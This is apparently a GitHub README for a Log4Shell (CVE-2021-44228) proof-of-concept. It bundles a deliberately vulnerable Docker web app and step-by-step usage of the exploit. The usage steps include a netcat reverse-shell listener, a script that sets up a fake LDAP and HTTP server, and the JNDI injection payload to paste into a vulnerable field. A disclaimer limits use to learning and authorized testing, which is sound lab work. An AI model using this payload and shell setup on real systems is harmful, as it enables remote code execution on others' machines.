# log4j-shell-poc

This repo has been forked from https://github.com/kozmer/log4j-shell-poc

This is a Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.

#### Usage:
* Clone this repo
```sh
git clone https://github.com/prasadashu/log4j-shell-poc.git
```

* Change directory to the cloned directory
```sh
cd log4j-shell-poc
```

* Install the requirements
```sh
pip install -r requirements.txt
```

* Install Java 8 JDK
```sh
apt install -y openjdk-8-jdk
```

* Copy the JDK to the current working directory
```sh
cp -r /usr/lib/jvm/java-8-openjdk-amd64 ./
```

* Start a netcat listener to accept reverse shell connection.<br>
```sh
nc -lvnp 9001
```

* Build the docker image
```sh
docker build -t log4j-vulnerable-application .
```

* Start the vulnerable application
```sh
docker run --network host log4j-vulnerable-application
```

* Launch the exploit.<br>
**Note:** For this to work, the extracted java archive has to be named: `java-8-openjdk-amd64`, and be in the same directory.
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Forked from Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

This script will setup the HTTP server and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.

<br>


Our vulnerable application
--------------------------

A Dockerfile has been added with the vulnerable webapp.

We can run the application using the following steps:

```sh
1: docker build -t log4j-vulnerable-application .
2: docker run --network host log4j-vulnerable-application
```
Once it is running, you can access it on localhost:8080

<br>

Getting the Java version.
--------------------------------------

We can install the required Java version using the below command.
```sh
apt install -y openjdk-8-jdk
```

Java versision installed will be
```sh
openjdk version "1.8.0_342"
OpenJDK Runtime Environment (build 1.8.0_342-8u342-b07-0ubuntu1~20.04-b07)
OpenJDK 64-Bit Server VM (build 25.342-b07, mixed mode)
```

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.

